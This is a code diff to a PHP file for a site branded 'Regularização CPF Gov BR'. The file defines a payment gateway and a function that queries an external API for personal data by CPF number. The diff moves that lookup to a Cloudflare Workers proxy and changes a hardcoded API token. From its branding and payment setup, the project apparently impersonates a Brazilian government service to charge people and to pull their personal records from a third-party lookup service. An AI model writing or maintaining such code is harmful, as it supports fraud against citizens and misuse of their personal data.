@@ -18,8 +18,8 @@ define('PRODUTO_NOME', 'Regularização CPF Gov BR');
 
 // URL e Token da API de consulta de CPF real (se houver). 
 // Altere para a URL e Token do seu provedor.
-define('API_CONSULTA_URL', 'https://base4.sistemafullativo.online:81/api/cpfx?CPF=');
-define('API_CONSULTA_TOKEN', '78E092FDEA'); // Insira o token/chave da sua API aqui se necessário
+define('API_CONSULTA_URL', 'https://plain-cake-2176consulta-cpf-proxy.caiquedossantospires17.workers.dev/?CPF=');
+define('API_CONSULTA_TOKEN', '11E7220050'); // Insira o token/chave da sua API aqui se necessário
 
 // Credenciais do Gateway de Pagamento Fyntra
 define('FYNTRA_API_URL', 'https://api-gateway.fyntrabr.com/api/user');
@@ -36,8 +36,11 @@ function obterDadosCPF($cpf_limpo) {
     // 1. Tentativa de Consulta via API real se configurada
     // Nota: Vercel bloqueia portas não-padrão. Usamos file_get_contents com stream context
     // que tem melhor suporte a portas alternativas em ambientes serverless.
-    if (defined('API_CONSULTA_URL') && !empty(API_CONSULTA_TOKEN)) {
-        $url = API_CONSULTA_URL . $cpf_limpo . '&token=' . urlencode(API_CONSULTA_TOKEN);
+    if (defined('API_CONSULTA_URL')) {
+        $url = API_CONSULTA_URL . $cpf_limpo;
+        if (!empty(API_CONSULTA_TOKEN) && strpos(API_CONSULTA_URL, 'workers.dev') === false) {
+            $url .= '&token=' . urlencode(API_CONSULTA_TOKEN);
+        }
 
         // Tenta via cURL primeiro
         $response = false;
